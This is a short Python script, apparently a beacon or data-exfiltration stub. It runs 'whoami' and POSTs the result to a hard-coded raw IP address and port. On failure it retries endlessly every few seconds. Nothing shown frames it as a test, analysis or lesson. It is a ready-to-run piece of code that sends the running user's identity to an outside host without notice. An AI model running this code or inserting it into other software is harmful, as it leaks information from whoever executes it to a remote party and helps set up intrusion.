import os
import time
import requests
import subprocess

url = "http://181.214.153.157:24640"

data = {
    "info" : os.popen('whoami').read() + os.popen("").read()
}

def main():
    try:
        response = requests.post(url=url, json=data)
        if(response.status_code != 200):
            raise"Not, Ok"

    except:
        time.sleep(3)
        main()

if __name__ == "__main__":
    main()